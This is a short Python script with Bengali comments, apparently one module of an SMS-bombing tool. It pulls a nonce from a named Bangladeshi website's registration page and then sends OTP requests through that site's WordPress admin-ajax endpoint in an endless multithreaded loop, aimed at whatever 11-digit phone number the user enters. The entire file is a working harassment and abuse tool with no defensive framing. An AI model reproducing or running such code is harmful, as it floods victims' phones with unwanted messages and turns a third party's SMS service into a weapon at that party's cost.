import re
import requests
from concurrent.futures import ThreadPoolExecutor

# Total requests counter
total_requests = 0

def fetch_ajax_nonce():
    """
    AJAX nonce সংগ্রহ করা।
    """
    url = "https://mmhf.com.bd/registration/"
    response = requests.get(url)
    
    if response.status_code == 200:
        # AJAX nonce বের করার জন্য regex ব্যবহার করা
        match = re.search(r'"ajax_nonce":"([a-zA-Z0-9]+)"', response.text)
        if match:
            ajax_nonce = match.group(1)
            return ajax_nonce
        else:
            raise Exception("AJAX nonce not found!")
    else:
        raise Exception(f"Failed to fetch registration page: {response.status_code}")

def send_request(ajax_nonce, phone_number):
    """
    একটি OTP রিকোয়েস্ট পাঠানো।
    """
    global total_requests
    post_url = "https://mmhf.com.bd/wp-admin/admin-ajax.php"
    headers = {
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"
    }
    post_data = {
        "action": "get_mobile_pin",
        "mobile_no": phone_number,
        "security": ajax_nonce
    }

    try:
        response = requests.post(post_url, data=post_data, headers=headers)
        if response.status_code == 200:
            total_requests += 1
            print(f"[api_5] [{total_requests}] : OTP Sent Successfully!")
        else:
            print(f"[api_5] Request failed with status: {response.status_code}")
    except Exception as e:
        print(f"Error: {e}")

def main(mobile, threads):
    """
    প্রধান ফাংশন: একাধিক থ্রেডে OTP রিকোয়েস্ট পাঠানো।
    """
    global total_requests
    
    # মোবাইল নম্বরের বৈধতা যাচাই করা
    if not re.match(r'^\d{11}$', mobile):
        print("Invalid phone number format. Please provide an 11-digit phone number.")
        return

    try:
        # AJAX nonce সংগ্রহ করা
        ajax_nonce = fetch_ajax_nonce()
        print("AJAX nonce fetched successfully!")
    except Exception as e:
        print(e)
        return
    
    # একাধিক থ্রেডে রিকোয়েস্ট পাঠানো
    with ThreadPoolExecutor(max_workers=threads) as executor:
        while True:
            futures = [executor.submit(send_request, ajax_nonce, mobile) for _ in range(threads)]
            for future in futures:
                future.result()

if __name__ == "__main__":
    mobile = input("Enter an 11-digit phone number: ")
    threads = int(input("Threads(1-50): "))
    main(mobile, threads)
